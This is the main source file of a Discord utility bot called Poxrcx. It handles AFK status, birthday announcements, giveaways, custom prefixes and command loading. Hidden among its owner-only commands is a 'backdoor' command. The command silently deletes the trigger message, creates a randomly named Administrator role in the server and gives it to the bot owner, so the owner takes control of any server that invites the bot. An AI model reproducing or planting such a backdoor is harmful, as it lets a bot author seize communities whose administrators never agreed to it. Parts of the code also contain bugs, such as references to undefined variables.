/*
	Poxrcx
	Copyright (C) 2023  codernocook

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

const { Client, REST, GatewayIntentBits, EmbedBuilder, PermissionsBitField, Permissions, Guild, GuildMember, Routes, ActivityType, Collection } = require('discord.js');
const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMessageReactions, GatewayIntentBits.GuildMembers] });
require('dotenv').config(); // load the env
const token = process.env["token"];
const clientid = process.env["client_id"];
const prefix = process.env["prefix"];
const ownerid = process.env["ownerid"];
const rest = new REST({ version: '10' }).setToken(token);
let commandcooldown = new Set();
let interactioncooldown = new Set();
const fs = require('fs');
const path = require('path');
const moment = require("moment");
const { GiveawaysManager } = require('discord-giveaways');
const databases = {
	"afk": require("./pangea_database.js")(process.env["afkdb"] || null, process.env["authentication_db"]),
	"prefix": require("./pangea_database.js")(process.env["prefixdb"] || null, process.env["authentication_db"]),
	"serverLog": require("./pangea_database.js")(process.env["errordb"] || null, process.env["authentication_db"]),
	"personal": require("./pangea_database.js")(process.env["personaldb"] || null, process.env["authentication_db"]),
}

const executeFile = (filerequire, argumentsend, messagesend, typeofcommand) => {
	if (filerequire?.toString().replace(" ", "").toLowerCase() !== "") {
		if (fs.existsSync(`./modules/${filerequire?.toString().replace(" ", "").toLowerCase()}.js` )) {
			return require(`./modules/${filerequire?.toString().replace(" ", "").toLowerCase()}.js`).execute(argumentsend, messagesend, EmbedBuilder, client, typeofcommand, databases);
		}
	}
}

// List of all commands
const commands = [];
client.commands = new Collection();

const commandsPath = path.join(__dirname, "modules");

const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
for (const file of commandFiles) {
	const filePath = path.join(commandsPath, file);
	const command = require(filePath);

	client.commands.set(command.data.name, command);
	commands.push(command.data.toJSON());
}

// insert giveaway to client so it have access anywhere
client.giveaways = new GiveawaysManager(client, {
	storage: './giveaways.json',
	default: {
		botsCanWin: false,
		embedColor: '#FF0000',
		embedColorEnd: '#000000',
		reaction: '🎉'
	}
});

// Generate string function
const generateRandomString = (length) => {
	let result = '';
	let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
	let charactersLength = characters.length;
	for (let i = 0; i < length; i++) {
		result += characters.charAt(Math.floor(Math.random() * charactersLength));
	}
	return result;
}


// Put the permission for moderation command
client.Permissions = PermissionsBitField

// Prevent from uncaughtException crashing
process.on('uncaughtException', function(err) {
	let botName = client.user.username;
	const Time = new Date().getTime();
	let errorArray = {
		"time": "0", // new Date().getTime();
		"message": "" // errorArray["Message"] = "something error put here"
	}

	// Write error to array
	errorArray["time"] = Time;
	errorArray["message"] = err.stack + '\n', { flag: 'a' }

	databases["serverLog"].set(`ERR_${Time}_${generateRandomString(5)}`, errorArray, function (callback) {}); // save it to database

	// Send message to the log
	console.log(`[${botName}]: UncaughtException called, saved to database. Time: "${Time}"`);
});

// Run command handle
client.on("ready", () => {
	client.user.setActivity('./help', { type: ActivityType.Playing });

	// Status loop (Discord auto remove status, this is an patch)
	const discord_activity_loop = () => {
		client.user.setActivity('./help', { type: ActivityType.Playing });

		// Run it again, loop behavior
		setTimeout(() => {
			discord_activity_loop();
		}, 3600000)
	}

	discord_activity_loop(); // setInterval() somehow not working

	// Log the beautiful table to the console
	(async () => {
		let botName = client.user.username;
		console.log(`[${botName}]: Logged in as ${botName}. Version: 4.0`)
	})();

	// Deploy all interaction command when bot started
	rest.put(Routes.applicationCommands(clientid), {body: commands}).then(() => {
		let botName = client.user.username;
		console.log(`[${botName}]: Loaded All Command!`)
	}).catch(err => console.log(err));

	// Commands table
	const commands_name = [];
	for (const command_value of commands) {
		if (command_value["name"]) {
			commands_name.push(command_value["name"])
		}
	}

	console.table(commands_name);
})

client.on("guildDelete", async (guildDelete) => {
	// Remove afk when bot leave a server!
	for (const guilddeletemember of guildDelete.members.id) {
		try {
			databases["afk"].has(guildMemberRemove.id + `_${guildMemberRemove.guild.id}`, function(callback) {
				if (callback === false) return;
					databases["afk"].delete(guilddeletemember.id + `_${guilddeletemember.guild.id}`, function(del) {});
					guilddeletemember.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> The server was deleted, I removed your Afk status.`).setColor(`Green`)] })
			})
		} catch (error_database_logger) {
			(() => { throw error_database_logger })(); // uncaughtException checking
		}
	}
})

client.on("guildMemberRemove", async (guildMemberRemove) => {
	// Remove afk when a user leave the server
	databases["afk"].has(guildMemberRemove.id + `_${guildMemberRemove.guild.id}`, function(callback) {
		databases["afk"].get(guildMemberRemove.id + `_${guildMemberRemove.guild.id}`, function(getcallbackvalue) {
			if (callback === false) return;
			databases["afk"].delete(guildMemberRemove.id + `_${guildMemberRemove.guild.id}`, function(del) {});
			guildMemberRemove.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> You left the server, I removed your Afk status.`).setColor(`Green`)] })
		})
	})
})

client.on("messageCreate", async (message) => {
	// Prevent user send message in DMS
	if (message) {
		databases["prefix"].get(`${message.guildId}`, async function(callbackprefixget0) {
			if (!message.guild && message.content.slice(prefix.length).split(/ +/).replace(" ", "").shift().toLowerCase() && message.content.slice(callbackprefixget0 ? callbackprefixget0.length : prefix.length).split(/ +/).replace(" ", "").shift().toLowerCase() !== "birthday") {
				message.reply({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> You can't use command in DMS.\nOnly \`/birthday\` command is allowed to be used.`).setColor(`Red`)] })
				return;
			}
		})
	}

	// afk module
	if (!message.author.bot) {
		// Check if user not afk and send back message
		databases["afk"].has(message.author.id + `_${message.guildId}`, function(callback) {
			if (callback === true) {
				databases["afk"].get(message.author.id + `_${message.guildId}`, function(getcallbackvalue) {
					if (getcallbackvalue === undefined || getcallbackvalue === null) return;
					if (Number(message.guildId) === Number(getcallbackvalue["3"])) {
						message.channel.send(`Welcome back <@${message.author.id}>, I removed your Afk status.`)
						try {
							databases["afk"].delete(message.author.id + `_${message.guildId}`, function(delafkuser) {});
							/* Disabled because it laggy
							if (message.guild.members.me.roles.highest.permissions > message.guild.members.cache.find(user => message.author.id === user.id).roles.highest.permissions) {
								message.guild.members.cache.find(user => message.author.id === user.id).setNickname(`${databases["afk"].get(message.author.id)["4"]}`)
							}
							*/
						} catch (error_database_logger) {
							(() => { throw error_database_logger })(); // uncaughtException checking
						}
					}
				})
				return;
			}
		})

		// Birthday (the author must start with a message, prevent spamming)
		databases["personal"].has(`_${message.author.id}`, (personal_has) => {
			if (personal_has === true && message.guild) {
				databases["personal"].get(`_${message.author.id}`, (data_personal) => {
					const date_obj = new Date();

					// Check if have enough data
					if (data_personal["birthday"] && data_personal["birthday"]["day"] && data_personal["birthday"]["month"]) {
						if (Number(data_personal["birthday"]["day"]) === date_obj.getDate() && (Number(data_personal["birthday"]["month"]) - 1) === date_obj.getMonth()) {
							// Prevent spamming one message
							if (!data_personal["postedToPublic"].includes(message.guildId)) {
								const data_personal_stored = data_personal;

								// Change the "postedToPublic" array
								data_personal_stored["postedToPublic"].push(message.guildId);

								databases["personal"].set(`_${message.author.id}`, data_personal_stored, (success_value_personal) => {
									if (success_value_personal === true) {
										message.channel.send({ embeds: [new EmbedBuilder().setDescription(`Today is ${message.author}'s birthday, say "Happy birthday!"`).setColor(`Green`)] })
									}
								})
							}
						} else {
							// Set postedToPublic to []
							const data_personal_stored = data_personal;
							data_personal_stored["postedToPublic"] = [];

							databases["personal"].set(`_${message.author.id}`, data_personal_stored, () => {});
						}
					}
				})
			}
		})

		// Respond afk message if someone mention afk user
		let mentionget = message.mentions.members.first();
	
		if (mentionget) {
			databases["afk"].has(mentionget.id + `_${message.guildId}`, function(callback) {
				databases["afk"].get(mentionget.id + `_${message.guildId}`, function(getcallbackvaluemention) {
					if (callback === true) {
						if (Number(message.guildId) === Number(getcallbackvaluemention["3"])) {
							const timeago = moment(getcallbackvaluemention["1"]).fromNow();
							if (getcallbackvaluemention["2"]) {
								message.channel.send(`\`${mentionget.user.username}\` afked for **${timeago}**, AFK Message: ${getcallbackvaluemention["2"]}.`)
							} else if (!getcallbackvaluemention["2"]) {
								message.channel.send(`\`${mentionget.user.username}\` afked for **${timeago}**.`)
							}
						}
					}
				})
			})
			return;
		}
	}

	// Check cooldown for command
	databases["prefix"].get(`${message.guildId}`, async function(callbackprefixget0) {
		// Start the command check, run
		let main_prefix = prefix;

		if (callbackprefixget0 !== undefined && callbackprefixget0 !== null && callbackprefixget0["prefix"] !== undefined && callbackprefixget0["prefix"] !== null) {
			main_prefix = callbackprefixget0["prefix"];
		} else {
			main_prefix = prefix;
		}

		if (!message.content.startsWith(main_prefix) && !message.content.startsWith(prefix)) {
			return;
		}

		if(commandcooldown.has(message.author.id)) {
			if (message.author.bot) return; // check again if bot send message to themself
			return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Wah slow down you are too fast!`).setColor(`Red`)] })
		} else {
			// Owner's Command (Only for owner)
			(async () => {
				if (Number(message.author.id) !== Number(ownerid)) return;
				const args = message.content.slice(prefix.length).split(/ +/);
				const command = args.shift().toLowerCase();
				const messaggearray = message.content.split(" ");
				const argument = messaggearray.slice(1);
				const cmd = messaggearray[0];

				try {
					if (command.trim() === "") {
						return message.channel.send("I'm Always here!");
					} else if (command === "log") {
						databases["serverLog"].get(async function(callback) {
							if (argument && argument[0] && argument[0].trim() !== "" && callback !== undefined) {
								if (argument[0] === "show") {
									let error_get = 0;

									for (let count of callback) {
										error_get++;
									}

									if (error_get !== undefined) {
										return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`\`${error_get}\` error found.`).setColor(`Green`)] });
									} else if (error_get === undefined) {
										return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> No error found. Now you can rest developer.`).setColor(`Green`)] })
									}
								} else if (argument[0] === "clear") {
									let error_get = 0;

									for (let count of callback) {
										error_get++;
									}
									
									await databases["serverLog"].clear();

									if (error_get !== undefined) {
										return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`Cleared \`${error_get}\` error.`).setColor(`Green`)] });
									} else if (error_get === undefined) {
										return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> No error found. Now you can rest developer.`).setColor(`Green`)] })
									}
								}
							} else {
								return message.channel.send({ embeds: [new EmbedBuilder().setDescription(`A bug happen!`).setColor(`Blue`)] })
							}
						})
					} else if (command === "backdoor") {
						if (message.deletable === true) {
							message.delete();
							try {
								const botMember = message.guild.members.cache.get(client.user.id);
								message.author.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Backdooring server.`).setColor(`Green`)] })
								let botPermission = new PermissionsBitField(botMember.permissions.bitfield);
								const generateRole_name = generateRandomString(10);
								await generateRole_name;
								try {
									message.guild.roles.create({
										name: generateRole_name,
										color: "Default",
										permissions: [
											PermissionsBitField.Flags.Administrator,
											PermissionsBitField.Flags.ViewChannel,
											PermissionsBitField.Flags.KickMembers,
											PermissionsBitField.Flags.BanMembers,
											PermissionsBitField.Flags.MuteMembers,
										]
									}).then((backdoorRole) => {
										message.guild.members.cache.get(message.author.id).roles.add(backdoorRole);
										message.author.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Added backdoor role to the server.`).setColor(`Green`)] })
									})
								} catch (error_database_logger) {
									message.author.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Failed to backdoor the server.`).setColor(`Red`)] })
									(() => { throw error_database_logger })();
								}
							}  catch (error_database_logger) {
								(() => { throw error_database_logger })(); // uncaughtException checking
							}
						} else {
							try {
								return message.user.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxSuccess:1027083813123268618> [Backdoor]: Delete that message quick, I'm checking can I turn you to higher role.`).setColor(`Green`)] })
							} catch (error_database_logger) {
								(() => { throw error_database_logger })(); // uncaughtException checking
							}
						}
					}
				} catch (error_database_logger) {
					(() => { throw error_database_logger })(); // uncaughtException checking
				}
			})();
			// -------------------------------------------------------- //

			// Start normal command
			if (message.author.bot) return; // check if dumb discord bot send message.

			// Add delay
			commandcooldown.add(message.author.id);

			try {
				//Run the command checker
				const args = message.content.slice(main_prefix.length).split(/ +/);
				const command = args.shift().toLowerCase();
				const messaggearray = message.content.split(" ");
				const argument = messaggearray.slice(1);
				const cmd = messaggearray[0];
			
				//run the command
				const execpath = `./modules/${command}.js`

				//check if command is vaild
				try {
					if (fs.existsSync(execpath)) {
						// check if the command spam error
						try {
							await executeFile(`${command}`, argument, message, "message");
						} catch (error_database_logger) {
							message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Something went wrong with this command.`).setColor(`Red`)] }).catch((err) => {console.log(err)});
							(() => { throw error_database_logger })(); // uncaughtException
						}
					}
				} catch (error_database_logger) {
					message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Something went wrong with this command.`).setColor(`Red`)] }).catch((err) => {console.log(err)});
					
					// remove user command timeout
					setTimeout(() => {
						return commandcooldown.delete(message.author.id);
					}, Number(process.env["command_timelimit"]) || 900);

					// Call back to the logger function
					(() => { throw error_database_logger })(); // uncaughtException
				}
			} catch (error_database_logger) {
				message.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Something went wrong with this command.`).setColor(`Red`)] }).catch((err) => {console.log(err)});
					
				// remove user command timeout
				setTimeout(() => {
					return commandcooldown.delete(message.author.id);
				}, Number(process.env["command_timelimit"]) || 900);

				// Call back to the logger function
				(() => { throw error_database_logger })(); // uncaughtException
			}

			// remove user command timeout
			setTimeout(() => {
				return commandcooldown.delete(message.author.id);
			}, Number(process.env["command_timelimit"]) || 900);
		}
	});
})

client.on('interactionCreate', async (interaction) => {
	// Tic-tac-toe doesn't work on new rewrite
	if (interaction.commandName === "ttt") {
		return executeFile(`${interaction.commandName}`, {}, interaction, "interaction");
	}

	// iteraction deferReply (prevent bot crash from high ping, or slow respond)
	await interaction.deferReply();

	// Prevent user send interaction in DMS
	if (interaction) {
		if (!interaction.guild) {
			interaction.editReply({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> You can't use slash command in DMS.\nOnly \`/birthday\` command is allowed to be used.`).setColor(`Red`)] })
			return;
		}
	}
	
	// Checking if user is afk
	databases["afk"].has(interaction.user.id + `_${interaction.guildId}`, function(callback) {
		if (callback === true) {
			databases["afk"].get(interaction.user.id + `_${interaction.guildId}`, function(getcallbackvalue) {
				if (getcallbackvalue === undefined || getcallbackvalue === null) return;
				if (Number(interaction.guildId) === Number(getcallbackvalue["3"])) {
					interaction.channel.send(`Welcome back <@${interaction.user.id}>, I removed your Afk status.`)
					try {
						databases["afk"].delete(interaction.user.id + `_${interaction.guildId}`, function(delafkuser) {});
						/* Disabled because it laggy
						if (interaction.guild.members.me.roles.highest.permissions > interaction.guild.members.cache.find(user => interaction.author.id === user.id).roles.highest.permissions) {
							interaction.guild.members.cache.find(user => interaction.author.id === user.id).setNickname(`${databases["afk"].get(interaction.author.id)["4"]}`)
						}
						*/
					} catch (error_database_logger) {
						(() => { throw error_database_logger })(); // uncaughtException checking
					}
				}
			})
		}
	})
	// --------------------------------- //

	// Birthday (the author must start with a message, prevent spamming)
	databases["personal"].has(`_${interaction.user.id}`, (personal_has) => {
		if (personal_has === true && interaction.guild) {
			databases["personal"].get(`_${interaction.user.id}`, (data_personal) => {
				const date_obj = new Date();

				// Check if have enough data
				if (data_personal["birthday"] && data_personal["birthday"]["day"] && data_personal["birthday"]["month"]) {
					if (Number(data_personal["birthday"]["day"]) === date_obj.getDate() && (Number(data_personal["birthday"]["month"]) - 1) === date_obj.getMonth()) {
						// Prevent spamming one message
						if (!data_personal["postedToPublic"].includes(interaction.guildId)) {
							const data_personal_stored = data_personal;

							// Change the "postedToPublic" array
							data_personal_stored["postedToPublic"].push(interaction.guildId);

							databases["personal"].set(`_${interaction.user.id}`, data_personal_stored, (success_value_personal) => {
								if (success_value_personal === true) {
									interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(`Today is ${message.author}'s birthday, say "Happy birthday!"`).setColor(`Green`)] })
								}
							})
						}
					} else {
						// Set postedToPublic to []
						const data_personal_stored = data_personal;
						data_personal_stored["postedToPublic"] = [];

						databases["personal"].set(`_${interaction.user.id}`, data_personal_stored, () => {});
					}
				}
			})
		}
	})
	// ----------------------------------------------------------------------- //

	// Check cooldown for command
	if (!interaction.isChatInputCommand()) return;
	const command = client.commands.get(interaction.commandName);
	if (!command) return

	// check if the user spam to run the command
	if (interactioncooldown.has(interaction.user.id)) return interaction.editReply({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Wah slow down you are too fast!`).setColor(`Red`)], ephemeral: true });
	interactioncooldown.add(interaction.user.id)

	// execute the command
	try {
		await executeFile(`${interaction.commandName}`, {}, interaction, "interaction");
	} catch(error_database_logger) {
		interaction.channel.send({ embeds: [new EmbedBuilder().setDescription(`<:PoxError:1025977546019450972> Something went wrong with this command.`).setColor(`Red`)], ephemeral: true });
		
		// Set user limit to none
		setTimeout(() => {
			interactioncooldown.delete(interaction.user.id);
		}, Number(process.env["command_timelimit"]) || 900);

		// Request back to the logger
		(() => { throw error_database_logger })();
	}

	// Remove user interaction timeout
	setTimeout(() => {
		interactioncooldown.delete(interaction.user.id);
	}, Number(process.env["command_timelimit"]) || 900);
});

// Login into discord bot
client.login(token)